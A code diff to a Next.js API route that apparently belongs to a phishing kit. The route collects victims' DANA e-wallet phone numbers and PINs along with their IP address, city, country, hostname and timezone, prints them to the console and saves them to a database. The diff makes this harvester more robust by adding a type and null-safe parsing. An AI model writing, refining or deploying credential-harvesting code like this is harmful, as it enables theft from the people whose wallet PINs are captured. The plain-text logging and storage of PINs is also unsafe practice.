@@ -4,6 +4,11 @@ import { NextResponse } from 'next/server'
 
 ConDB()
 
+type UserInfoItem = {
+  key: string;
+  value: string;
+}
+
 export const POST = async(req: any) => {
     const data = await req.formData()
     const auth = req.headers.get('Authorization')
@@ -17,18 +22,18 @@ export const POST = async(req: any) => {
      const nomor_dana = data.get('nomor')
      const pin_dana = data.get('pin_dana')
      const uInfo = data.get('user_info')
-     const parsedUserInfo = JSON.parse(uInfo)
+     const parsedUserInfo: UserInfoItem[] = uInfo ? JSON.parse(uInfo) : [];
 
      console.log(`${nomor_dana}\n${pin_dana}\n${uInfo}\n${parsedUserInfo}`)
      
      const user_info = {
-       ip_address: parsedUserInfo.find(item => item.key === 'Ip Adress').value,
-       city: parsedUserInfo.find(item => item.key === 'Kota').value,
-       country: parsedUserInfo.find(item => item.key === 'Negara').value,
-       loc: parsedUserInfo.find(item => item.key === 'Kode lokasi').value,
-       hostname: parsedUserInfo.find(item => item.key === 'hostname').value,
-       org: parsedUserInfo.find(item => item.key === 'org').value,
-       timezone: parsedUserInfo.find(item => item.key === 'Zona waktu').value
+       ip_address: parsedUserInfo.find(item => item.key === 'Ip Adress')?.value || '',
+       city: parsedUserInfo.find(item => item.key === 'Kota')?.value || '',
+       country: parsedUserInfo.find(item => item.key === 'Negara')?.value || '',
+       loc: parsedUserInfo.find(item => item.key === 'Kode lokasi')?.value || '',
+       hostname: parsedUserInfo.find(item => item.key === 'hostname')?.value || '',
+       org: parsedUserInfo.find(item => item.key === 'org')?.value || '',
+       timezone: parsedUserInfo.find(item => item.key === 'Zona waktu')?.value || ''
      }
 
      await Dana.create({nomor_dana, pin_dana, user_info})
